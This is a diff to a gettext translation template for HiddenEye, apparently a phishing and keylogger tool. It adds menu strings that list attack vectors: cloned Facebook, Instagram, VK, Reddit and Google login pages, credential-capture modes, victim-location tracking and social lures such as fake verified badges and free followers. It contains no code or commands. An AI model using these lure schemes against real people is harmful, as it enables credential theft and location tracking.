@@ -5,7 +5,7 @@
 msgid ""
 msgstr ""
 "Project-Id-Version: PACKAGE VERSION\n"
-"POT-Creation-Date: 2020-05-10 12:47+0300\n"
+"POT-Creation-Date: 2020-05-10 16:07+0300\n"
 "PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
 "Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
 "Language-Team: LANGUAGE <LL@li.org>\n"
@@ -31,11 +31,118 @@ msgid "{1}[{0} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALEN
 msgstr ""
 
 #:
-#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:19
-msgid "{0}________________________________________________________________________________"
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:20
+msgid ""
+"------------------------\n"
+"SELECT ANY ATTACK VECTOR:\n"
+"------------------------"
 msgstr ""
 
-#: HiddenEye/Defs/LocalizationManager/lang_global_usage.py:11
-msgid "TEST of parser"
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:21
+msgid ""
+"\n"
+"{0}PHISHING-MODULES:"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:35
+msgid ""
+"\n"
+"{0}ADDITIONAL-TOOLS:"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:37
+msgid "{0}[{1}0A{0}]{1} Get Victim Location"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:38
+msgid ""
+"\n"
+"Operation mode:\n"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:40
+msgid "{0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:40
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:43
+msgid "{0}[{1}1{0}]{1} Standard Page Phishing"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:41
+msgid "{0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:41
+msgid "{0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:43
+msgid "{0}[{1}3{0}]{1} New Google Web"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:44
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:50
+msgid "{0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:46
+msgid "{0}[{1}1{0}]{1} Standard Instagram Web Page Phishing"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:46
+msgid "{0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:47
+msgid "{0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:47
+msgid "{0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:48
+msgid "{0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:50
+msgid "{0}[{1}1{0}]{1} Standard VK Web Page Phishing"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:52
+msgid "{0}[{1}1{0}]{1} New reddit page"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:52
+msgid "{0}[{1}2{0}]{1} Old reddit page"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:54
+msgid "{0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)"
+msgstr ""
+
+#:
+#: HiddenEye/Defs/LocalizationManager/lang_action_manager/lang_main_runner.py:54
+msgid "{0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE)"
 msgstr ""
 
